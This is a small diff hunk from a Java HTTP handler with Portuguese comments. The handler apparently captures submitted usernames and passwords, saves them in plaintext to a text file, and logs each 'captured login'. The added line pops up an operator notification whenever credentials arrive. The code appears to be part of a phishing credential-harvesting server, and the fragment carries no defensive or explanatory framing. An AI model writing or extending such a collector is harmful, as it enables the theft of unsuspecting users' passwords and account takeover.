@@ -98,6 +98,7 @@ class ServidorHandler implements HttpHandler {
                 // Escreve as informações no arquivo com o println
                 pw.println("Usuário: " + usuario + " | Senha: " + senha);
                 System.out.println(">>> Login capturado e salvo: " + usuario);
+                Interface.notificarLoginRecebido();
 
             } catch(Exception erro){
                 System.err.println("ERRO AO SALVAR TXT: " + erro);
